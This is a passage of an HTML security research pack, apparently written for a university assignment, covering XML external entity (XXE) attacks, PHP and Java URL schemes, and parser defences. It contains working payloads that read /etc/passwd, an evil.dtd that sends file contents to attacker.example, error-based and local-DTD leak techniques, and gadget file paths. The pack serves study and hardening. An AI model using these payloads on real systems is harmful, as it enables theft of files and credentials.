+<strong>document&rsquo;s</strong> base URI, so <code>../../../../etc/passwd</code> traverses from
+wherever the parser thinks it is.</p>
+
+<div class="note warn"><span class="lbl">One caveat, and it bites people</span>
+<p>&ldquo;Resolved against the base URI&rdquo; is the whole mechanism, so it only lands on the
+filesystem when the base URI <em>is</em> local &mdash; which it is for a document parsed from a
+string, a stream or a local file. Put the same scheme-less path inside a DTD you are serving over
+HTTP and it resolves against <strong>that</strong> URL and comes straight back to your own web
+server. See &sect;5.4, where exactly that happened in the lab. Rule of thumb: <strong>drop the scheme
+in the document, name the scheme in a remote DTD.</strong></p></div>
+
+<h3><span class="n">4.2</span>PHP stream wrappers</h3>
+<p>libxml2 in PHP resolves system identifiers through PHP&rsquo;s registered stream wrappers.
+A default install reports:</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>wrappers: https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar, zip</code></pre></div><ul>
+<li><strong><code>php://filter/convert.base64-encode/resource=&lt;path&gt;</code></strong> &mdash; the
+workhorse; see &sect;3.2.</li>
+<li><strong><code>compress.zlib://&lt;path&gt;</code></strong> &mdash; returns the file contents, and
+handles gzip transparently, so it reads <code>.gz</code> logs and backups that <code>file://</code>
+would hand you as binary garbage.</li>
+<li><strong><code>phar://&lt;archive&gt;/&lt;entry&gt;</code></strong> &mdash; reads an entry out of an
+archive, and accepts plain ZIPs, not just real phars. Deployed apps ship as archives; this reads
+inside them.</li>
+<li><strong><code>data://text/plain;base64,&hellip;</code></strong> &mdash; not a <em>file</em> read; it
+stages a payload. The classic use is smuggling a whole second-stage system identifier past a
+filter.</li>
+</ul><div class="blk code"><div class="blk-label">data:// staging a file:///etc/passwd identifier</div><pre><code>&lt;!DOCTYPE t [ &lt;!ENTITY % init SYSTEM
+   "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt; %init; ]&gt;&lt;foo/&gt;</code></pre></div><div class="note warn"><span class="lbl">Two cheat-sheet payloads that simply do not work here</span>
+<p><code>zip://&lt;archive&gt;#&lt;entry&gt;</code> fails: libxml2 parses the <code>#</code> as a URI
+fragment and refuses, and percent-encoding does not rescue it. <strong>Use <code>phar://</code>
+instead</strong> &mdash; same capability, no fragment. <code>glob://</code> fails too: it is a
+directory-enumeration wrapper that exposes no readable stream. <code>expect://cmd</code> gives
+command execution but needs the PECL <code>expect</code> extension, which is not bundled &mdash;
+treat it as &ldquo;rarely available&rdquo;, not standard.</p></div><div class="blk term"><div class="blk-label">verified output</div><pre><code>zip:// raw #        =&gt; (parse failed)  [Fragment not allowed]
+zip:// %23 encoded  =&gt; (empty)  [failed to load external entity "zip://...%23conf/db.txt"]
+glob://             =&gt; (empty)  [failed to load external entity "glob:///.../*.txt"]
+phar:// entry       =&gt; ZIP-ENTRY: password=s3cr3t</code></pre></div><h3><span class="n">4.3</span>Java</h3>
+<p><strong><code>netdoc:</code> is dead.</strong> <code>sun.net.www.protocol.netdoc.Handler</code>
+was <strong>removed in JDK 9</strong> (JDK-8154234 / JDK-8176351); constructing such a URL now
+throws. Every payload list still recommending <code>netdoc:/etc/passwd</code> is targeting Java 8 and
+earlier &mdash; say this explicitly, it is the single most-repeated stale XXE payload.</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>D netdoc: (legacy sun handler)  =&gt; EXC MalformedURLException: unknown protocol: netdoc
+F jar:file:...!/entry           =&gt; ZIP-ENTRY: password=s3cr3t</code></pre></div><p><code>jar:file:///path/archive!/entry</code> does nest a <code>file:</code> URL, so it is not
+scheme-free in the strict sense, but it reads <em>inside</em> archives, which plain <code>file:</code>
+cannot. <code>jar:http://attacker/x.zip!/y</code> makes the JVM download a remote archive to a temp
+file first &mdash; a file-write and DoS primitive as much as a read one. For the strict &ldquo;no
+<code>file://</code>&rdquo; constraint, the Java answer is the bare path of &sect;4.1. And note the
+JDK&rsquo;s default <code>DocumentBuilderFactory</code> resolves external entities with no
+configuration at all &mdash; see &sect;6.</p>
+
+<h3><span class="n">4.4</span>Scheme-free and DOCTYPE-free: XInclude</h3>
+<p>Covered in &sect;3.4, and worth repeating here because it answers both questions at once: no
+<code>file://</code>, no <code>DOCTYPE</code>, arbitrary content, verified in both stacks.</p>
+</section>
+<section id="blind">
+<h2><span class="n">Part 5</span>Blind XXE and data exfiltration</h2>
+<p>Blind XXE means the entity is resolved but nothing comes back in the response. Four channels, in
+rough order of preference.</p>
+
+<h3><span class="n">5.1</span>Step 0 &mdash; prove resolution happens</h3><div class="blk code"><pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [ &lt;!ENTITY % ext SYSTEM "http://&lt;id&gt;.collab.example/x"&gt; %ext; ]&gt;
+&lt;r&gt;&lt;/r&gt;</code></pre></div><p>A DNS lookup alone is enough to confirm; in egress-filtered environments DNS often escapes
+where HTTP does not. Use Burp Collaborator, <code>interactsh</code>, or your own authoritative
+DNS.</p>
+
+<h3><span class="n">5.2</span>Why the naive nested payload always fails</h3>
+<p>The obvious approach &mdash; define <code>%file</code> and reference it inside a second entity
+declaration, all in the internal subset &mdash; is forbidden by XML 1.0 itself. The well-formedness
+constraint <em>PEs in Internal Subset</em> says a parameter-entity reference may not occur
+<strong>within a markup declaration</strong> in the internal subset.</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>--- Naive attempt: nest parameter entities in the INTERNAL subset ---
+  ERR: PEReferences forbidden in internal subset
+  ERR: PEReference: %eval; not found
+  ERR: PEReference: %exfil; not found</code></pre></div><p>That single constraint is <em>the</em> reason blind XXE needs an external DTD. It is the best
+thing to open a presentation with, because it explains every payload that follows.</p>
+
+<h3><span class="n">5.3</span>Channel 1 &mdash; out-of-band via an external DTD</h3><div class="blk code"><div class="blk-label">evil.dtd, hosted by the attacker</div><pre><code>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.example/steal?d=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre></div><div class="blk code"><div class="blk-label">payload</div><pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;r&gt;x&lt;/r&gt;</code></pre></div><p>Mechanics, in order: <code>%dtd;</code> fetches the DTD &rarr; <code>%eval;</code> expands to a
+<em>declaration</em> of <code>%exfil</code> (the <code>&amp;#x25;</code> is a literal <code>%</code>,
+needed because a bare <code>%</code> inside an entity value would be parsed as a reference) &rarr;
+<code>%exfil;</code> is dereferenced, and resolving it makes the parser fetch a URL carrying the file
+contents in its query string.</p><div class="blk term"><div class="blk-label">verified — attacker collector log</div><pre><code>HIT /evil.dtd
+HIT /steal?d=U0VDUkVUX0ZMQUc9Y3UtY3J5cHRvLTIwMjYKZGJfcGFzc3dvcmQ9UEBzc3cwcmQK
+
+$ base64 -d  =&gt;  SECRET_FLAG=cu-crypto-2026
+                 db_password=P@ssw0rd</code></pre></div><ul>
+<li><strong>Always base64 first.</strong> Raw file bytes contain <code>\n</code>, <code>&amp;</code>,
+<code>#</code> and <code>%</code>, all of which either terminate the URI or get re-parsed as markup.
+<code>php://filter</code> does this for free on PHP; on other stacks you get one line at best, which
+is why so many write-ups warn &ldquo;you may only receive the first line&rdquo;.</li>
+<li><strong>Size limits.</strong> The data rides in a URL. Servers and libraries cap URL length
+(commonly 4&ndash;8&nbsp;KB) and base64 inflates by 4/3, so large files need exfiltrating in
+pieces.</li>
+<li><strong>DNS-only egress:</strong> put the data in a label &mdash;
+<code>'http://%file;.collab.example/'</code> &mdash; subject to the 63-byte-per-label and 253-byte
+total limits, so it carries only small secrets and needs an alphabet-safe encoding.</li>
+</ul>
+
+<h3><span class="n">5.4</span>Channel 2 &mdash; error-based</h3>
+<p>Force the parser to fail on a path that <em>contains</em> the stolen data, and read it out of the
+error the application echoes. No outbound request ever carries the bytes.</p><div class="blk code"><div class="blk-label">error.dtd</div><pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;</code></pre></div><p><strong>It leaks in both stacks.</strong> Java throws straight out of <code>parse()</code>
+with the file in the message, and the same content comes back whether the application prints
+<code>e.getMessage()</code>, installs a full SAX <code>ErrorHandler</code>, or walks the
+<code>getCause()</code> chain:</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>A. no handler, print e.getMessage() only
+  caught: FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
+B. full ErrorHandler, print handler output
+  caught: FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
+C. no handler, walk getCause() chain
+  cause:  FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)
+
+--- PHP / libxml2 leaks it as a URI-validation error ---
+Invalid URI: file:///nonexistent/SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+&gt;&gt;&gt; LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd</code></pre></div><div class="note warn"><span class="lbl">The trap that makes this &ldquo;not work&rdquo; for most people</span>
+<p>Inside a DTD fetched over HTTP, the DTD&rsquo;s own URL becomes the base URI, so a scheme-less
+system identifier &mdash; <em>even an absolute filesystem path</em> &mdash; is resolved against it and
+fetched back from the attacker&rsquo;s own web server instead of the target&rsquo;s disk. The first
+version of this lab made exactly that mistake, and the collector log proves it:</p></div><div class="blk term"><div class="blk-label">verified output</div><pre><code>HIT /error.dtd
+HIT /home/user/Cryptography/research/lab/tmp/secret.txt      &lt;-- came back to the attacker</code></pre></div><p><code>%file</code> then held whatever that request returned, and the &ldquo;leak&rdquo; was
+that string rather than the file. <strong>In a remote DTD, always name the scheme</strong>
+(<code>file:///etc/passwd</code>, or a <code>php://filter/&hellip;</code> URL, which carries its own).
+This is the exact opposite of &sect;4.1, where dropping the scheme is the win &mdash; the difference
+is entirely which base URI applies.</p>
+
+<p>Two practical notes: error-based only reaches the attacker if the application actually surfaces
+parser errors (a flat <code>400 Bad Request</code> gives you nothing; a stack trace or a SOAP
+<code>&lt;faultstring&gt;</code> gives you everything), and the leak is bounded by error-message and
+path-length limits, so it suits small high-value files &mdash; <code>.env</code>, a private key
+header, <code>/proc/self/environ</code> &mdash; rather than whole source trees.</p>
+
+<h3><span class="n">5.5</span>Channel 3 &mdash; local DTD reuse, zero outbound traffic</h3>
+<p>When egress is blocked entirely you cannot fetch <code>evil.dtd</code>. The trick (Yunusov &amp;
+Osipov; catalogued by GoSecure&rsquo;s <code>dtd-finder</code>) is to load a DTD <strong>already on
+the target&rsquo;s disk</strong> and <em>redefine</em> one of the parameter entities it declares.
+Because the redefinition happens inside an external subset, the nesting restriction of &sect;5.2 no
+longer applies.</p>
+
+<p>The canonical Linux gadget is <code>/usr/share/xml/fontconfig/fonts.dtd</code>, which declares at
+line 148:</p><div class="blk code"><div class="blk-label">/usr/share/xml/fontconfig/fonts.dtd:148</div><pre><code>&lt;!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'&gt;</code></pre></div><div class="blk code"><div class="blk-label">payload — no network required</div><pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [
+  &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;
+  &lt;!ENTITY % constant 'aaa)&gt;
+     &lt;!ENTITY &amp;#x25; file SYSTEM "/etc/passwd"&gt;
+     &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+     &amp;#x25;eval;
+     &amp;#x25;error;
+     &lt;!ELEMENT aa (bb'&gt;
+  %local_dtd;
+]&gt;
+&lt;r&gt;x&lt;/r&gt;</code></pre></div><div class="blk term"><div class="blk-label">verified — OpenJDK 21, no outbound connection</div><pre><code>FileNotFoundException: /nonexistent/SECRET_FLAG=cu-crypto-2026 db_password=P@ssw0rd (No such file or directory)</code></pre></div><p>The <code>aaa)&gt;</code> prefix and the trailing <code>&lt;!ELEMENT aa (bb</code> close the
+markup declaration the entity was originally embedded in and re-open a syntactically valid one, so
+the surrounding DTD still parses.</p>
+
+<p><strong>Finding a gadget DTD.</strong> <code>locate .dtd</code> or
+<code>find / -name '*.dtd'</code>. On the lab image:
+<code>/usr/share/xml/fontconfig/fonts.dtd</code>,
+<code>/usr/share/xml/schema/xml-core/catalog.dtd</code>,
+<code>/usr/share/glib-2.0/schemas/gschema.dtd</code>,
+<code>/usr/share/polkit-1/policyconfig-1.dtd</code>, plus a large set under
+<code>/usr/lib/libreoffice/share/dtd/</code>. On Windows the well-known ones are
+<code>C:\Windows\System32\wbem\xml\cim20.dtd</code> (entity <code>%CIMName</code>),
+<code>wmi20.dtd</code>, and <code>C:\Windows\System32\xwizard.dtd</code>
+(<code>%onerrortypes</code>). Confirm the error message even <em>contains</em> filenames first:</p><div class="blk code"><pre><code>&lt;!DOCTYPE r [ &lt;!ENTITY % local_dtd SYSTEM "file:///abcxyz/"&gt; %local_dtd; ]&gt;&lt;r&gt;&lt;/r&gt;</code></pre></div><h3><span class="n">5.6</span>Channel 4 &mdash; last resort: boolean and timing</h3>
+<p>If nothing is reflected and nothing egresses, differential behaviour remains: a payload
+referencing an existing file parses, one referencing a missing file errors. That is a one-bit
+existence oracle per request. Timing (<code>file:///dev/random</code>, or a <code>SYSTEM</code>
+pointing at a slow internal host) gives another. Slow, but it maps the filesystem and the internal
+network.</p>
+
+<h3><span class="n">5.7</span>Delivery: XXE is not only in <code>application/xml</code></h3>
+<p>Worth a slide. All of these reach an XML parser: SOAP bodies; SVG uploads
+(<code>&lt;image xlink:href=&hellip;&gt;</code>); <strong>DOCX / XLSX / PPTX</strong> &mdash; rewrite
+<code>[Content_Types].xml</code> or <code>word/document.xml</code> inside the ZIP; XML sitemaps and
+RSS ingest; SAML assertions; XMLRPC; and JSON endpoints that also accept XML &mdash; flip
+<code>Content-Type: application/json</code> to <code>application/xml</code> and resend, since many
+frameworks content-negotiate the body parser.</p>
+</section>
+
+<section id="defences">
+<h2><span class="n">Part 6</span>Defences &mdash; what actually works</h2>
+<p>Measured, not quoted.</p>
+
+<h3>Java &mdash; OpenJDK 21, <code>DocumentBuilderFactory</code></h3><div class="blk term"><div class="blk-label">verified output</div><pre><code>default DocumentBuilderFactory (JDK 21)  =&gt; LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+FEATURE_SECURE_PROCESSING = true         =&gt; BLOCKED (SAXParseException)
+setXIncludeAware(false) only             =&gt; LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+disallow-doctype-decl = true             =&gt; BLOCKED (SAXParseException)
+external-general-entities = false        =&gt; (blocked: empty)
+setExpandEntityReferences(false)         =&gt; (blocked: empty)
+ACCESS_EXTERNAL_DTD = ""                 =&gt; BLOCKED (SAXParseException)</code></pre></div><ul>
+<li><strong>XXE is on by default in Java.</strong> A stock <code>DocumentBuilderFactory</code> reads
+local files. This is the single most important line in the table.</li>
+<li><code>http://apache.org/xml/features/disallow-doctype-decl = true</code> is the strongest and
+cheapest control &mdash; it rejects the document outright and kills every DTD-based variant.</li>
+<li><code>FEATURE_SECURE_PROCESSING</code> and <code>ACCESS_EXTERNAL_DTD=""</code> also blocked it on
+JDK 21.</li>
+<li><code>setXIncludeAware(false)</code> does nothing against entity XXE &mdash; but it <em>is</em>
+what stops &sect;3.4, so you need both.</li>
+</ul>
+
+<h3>PHP 8.4 / libxml 2.9.14</h3><div class="blk term"><div class="blk-label">verified output</div><pre><code>simplexml_load_string, DEFAULT flags       =&gt; (blocked: empty)
+simplexml_load_string, LIBXML_NOENT        =&gt; SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+DOMDocument-&gt;loadXML, DEFAULT flags        =&gt; (blocked: empty)
+DOMDocument-&gt;loadXML, LIBXML_NOENT         =&gt; SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+DOMDocument, LIBXML_NOENT|LIBXML_NONET     =&gt; SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd</code></pre></div><ul>
+<li><strong>PHP&rsquo;s defaults are safe</strong>; it is the application passing
+<code>LIBXML_NOENT</code> that creates the vulnerability. Grep for it.</li>
+<li><strong><code>LIBXML_NONET</code> does not stop local file reads</strong> &mdash; it only blocks
+network fetches, and is routinely mistaken for an XXE fix.</li>
+</ul>
+
+<h3>SSI</h3>
+<p>Prefer not enabling SSI at all. If it is required: <code>Options IncludesNOEXEC</code> rather than
+<code>+Includes</code>; never let user input reach a page that is SSI-parsed; serve uploads from a
+path or origin with SSI parsing off and <code>.shtml</code>, <code>.shtm</code>, <code>.stm</code> on
+the deny-list; on Tomcat leave <code>allowExec=false</code> and remove <code>printenv</code> from
+anything that ships. Patch levels that matter: httpd &ge; 2.4.66, nginx &ge; 1.31.3 / 1.30.4, Tomcat
+&ge; 7.0.94 / 8.5.40 / 9.0.19.</p>
+</section>
+<section id="lab">
+<h2><span class="n">Part 7</span>Reproducing the lab</h2>
+<p>Every <strong>verified</strong> claim above comes from <code>research/lab/</code> in the
+repository. Requirements: PHP&nbsp;&ge;&nbsp;8, JDK&nbsp;&ge;&nbsp;17, Python&nbsp;3. The collector
+binds to loopback only and the payloads read files the scripts create themselves, so nothing leaves
+the machine.</p><div class="blk code"><pre><code>research/lab/
+  README.md              how to run each piece, with expected output
+  php_xxe_schemes.php    §3.1–§3.4, §4.2 — wrappers, filters, CDATA, XInclude
+  XxeSchemes.java        §4.1, §4.3 — bare paths, netdoc, jar, XInclude
+  php_defaults.php       §6 — PHP flag matrix
+  DefTest.java           §6 — Java hardening matrix
+  oob_collector.py       §5.3 — attacker-side collector, loopback only
+  evil.dtd               §5.3 — out-of-band exfiltration DTD
+  error.dtd              §5.4 — error-based DTD
+  blind_xxe.php          §5.2–§5.4 — internal-subset limit, OOB, error-based
+  LocalDtdError.java     §5.4, §5.5 — error-based, remote vs on-disk DTD</code></pre></div><div class="blk code"><div class="blk-label">running it</div><pre><code># schemes, wrappers and source-code reads
+php php_xxe_schemes.php
+javac XxeSchemes.java &amp;&amp; java XxeSchemes
+
+# blind XXE — start the collector in another terminal first
+python3 oob_collector.py
+php blind_xxe.php &amp;&amp; javac LocalDtdError.java &amp;&amp; java LocalDtdError &amp;&amp; cat hits.log
+
+# defences
+php php_defaults.php
+javac DefTest.java &amp;&amp; java DefTest</code></pre></div></section>
+
+<section id="sources" class="src">
+<h2><span class="n">Part 8</span>Sources</h2>
+
+<h3>SSI &mdash; primary</h3>
+<ul>
+<li>Apache <code>mod_include</code> reference &mdash; <a href="https://httpd.apache.org/docs/current/mod/mod_include.html">httpd.apache.org/docs/current/mod/mod_include.html</a></li>
+<li>Apache expression syntax (<code>ap_expr</code>), including the &ldquo;restricted&rdquo; markings &mdash; <a href="https://httpd.apache.org/docs/current/expr.html">httpd.apache.org/docs/current/expr.html</a></li>
+<li>Apache httpd source: <code>mod_cgid.c</code>, <code>util.c</code>, <code>gen_test_char.c</code>, <code>CHANGES</code> &mdash; <a href="https://github.com/apache/httpd">github.com/apache/httpd</a></li>
+<li>nginx <code>ngx_http_ssi_module</code> &mdash; <a href="https://nginx.org/en/docs/http/ngx_http_ssi_module.html">nginx.org/en/docs/http/ngx_http_ssi_module.html</a></li>
+<li>nginx security advisories &mdash; <a href="https://nginx.org/en/security_advisories.html">nginx.org/en/security_advisories.html</a></li>
+<li>Tomcat SSI How-To &mdash; <a href="https://tomcat.apache.org/tomcat-9.0-doc/ssi-howto.html">tomcat.apache.org/tomcat-9.0-doc/ssi-howto.html</a></li>
+<li>mod_perl <code>Apache::Include</code> (<code>#perl sub=</code>) &mdash; <a href="https://perl.apache.org/docs/1.0/api/Apache/Include.html">perl.apache.org/docs/1.0/api/Apache/Include.html</a></li>
+</ul>
+
+<h3>SSI &mdash; vulnerability records</h3>
+<ul>
+<li>ASF advisory JSON, CVE-2025-58098 &mdash; <a href="https://github.com/apache/httpd-site/blob/main/content/security/json/CVE-2025-58098.json">apache/httpd-site</a></li>
+<li>CVE-2026-56434 &mdash; <a href="https://github.com/advisories/ghsa-m73p-xg7q-m8f2">GHSA-m73p-xg7q-m8f2</a></li>
+<li>CVE-2019-0221 &mdash; <a href="https://seclists.org/fulldisclosure/2019/May/50">Full Disclosure</a>, <a href="https://www.rapid7.com/db/vulnerabilities/apache-tomcat-cve-2019-0221/">Rapid7</a></li>
+<li>CVE-2009-1195 &mdash; <a href="https://bugzilla.redhat.com/show_bug.cgi?id=489436">Red Hat Bugzilla 489436</a></li>
+<li>CVE-2004-0940 &mdash; <a href="https://security.gentoo.org/glsa/200411-03">GLSA 200411-03</a>, <a href="https://www.exploit-db.com/exploits/587">Exploit-DB 587</a></li>
+<li>CVE-2001-0506 / MS01-044 &mdash; <a href="https://nvd.nist.gov/vuln/detail/CVE-2001-0506">NVD</a></li>
+<li>CVE-2024-3788, CVE-2023-1728 &mdash; CVE records via <a href="https://github.com/CVEProject/cvelistV5">CVEProject/cvelistV5</a></li>
+<li>OWASP, SSI Injection &mdash; <a href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection">owasp.org</a>; CWE-97 &mdash; <a href="https://cwe.mitre.org/data/definitions/97.html">cwe.mitre.org</a>; CAPEC-101 &mdash; <a href="https://capec.mitre.org/data/definitions/101.html">capec.mitre.org</a></li>
+<li>PortSwigger, SSI injection &mdash; <a href="https://portswigger.net/kb/issues/00101100_ssi-injection">portswigger.net</a></li>
+</ul>
+
+<h3>XXE</h3>
+<ul>
+<li>OWASP XXE Prevention Cheat Sheet &mdash; <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md">OWASP/CheatSheetSeries</a></li>
+<li>PayloadsAllTheThings, XXE Injection &mdash; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md">swisskyrepo/PayloadsAllTheThings</a></li>
+<li>GoSecure <code>dtd-finder</code> local-DTD payload list &mdash; <a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">GoSecure/dtd-finder</a></li>
+<li>JDK-8154234 / JDK-8176351, removal of the <code>netdoc</code> handler &mdash; <a href="https://bugs.openjdk.org/browse/JDK-8154234">bugs.openjdk.org</a></li>
+<li>XML 1.0, WFC: PEs in Internal Subset &mdash; <a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset">w3.org/TR/xml</a></li>
+<li>XInclude 1.0, <code>parse="text"</code> &mdash; <a href="https://www.w3.org/TR/xinclude/">w3.org/TR/xinclude</a></li>
+</ul>
+
+<footer>Research pack for the SSI / XXE assignment &mdash; Khaled Mohamed, Computer Science, Cairo
+University. Findings marked verified were reproduced on PHP 8.4.19 / libxml 2.9.14 and OpenJDK
+21.0.10; the harnesses are in <code>research/lab/</code>. For authorised testing only.</footer>
+</section>
+
+</main>
+</div>
+
+<script>
+(function () {
+  var buttons = Array.prototype.slice.call(document.querySelectorAll('.filters button'));
+  var cards = Array.prototype.slice.call(document.querySelectorAll('.cve'));
+  buttons.forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var f = btn.getAttribute('data-f');
+      buttons.forEach(function (b) { b.setAttribute('aria-pressed', String(b === btn)); });
+      cards.forEach(function (c) { c.hidden = (f !== 'all' && c.getAttribute('data-t') !== f); });
+    });
+  });
+})();
+</script>
